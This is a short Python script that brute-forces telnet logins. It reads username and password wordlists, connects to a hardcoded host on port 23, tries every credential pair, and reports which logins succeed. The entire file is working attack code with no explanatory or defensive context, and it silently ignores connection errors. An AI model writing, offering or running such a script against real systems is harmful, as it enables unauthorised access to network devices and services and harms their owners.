import telnetlib
from os import getcwd
from socket import error as SocketError
import errno

retries = 0
target = "192.168.1.2"
port = "23"
userPath = "{0}/resources/wordlist/users.txt".format(getcwd())
passwordPath = "{0}/resources/wordlist/passwords.txt".format(getcwd())

users = open(userPath, "r").readlines()
words = open(passwordPath, "r").readlines()
for user in users:
    for password in words:
        try:
            tn = telnetlib.Telnet(target, port)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(user + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
            tn.close()

            if i != -1:
                print("Target: {}:{} Authentication Failed - Username: '{}' Password: '{}'".format(target, port, user, password))
            else:
                print("Target: {}:{}: Authentication Succeed - Username: '{}' Password: '{}'".format(target, port, user, password))

            tn.close()

        except Exception as e:
            pass
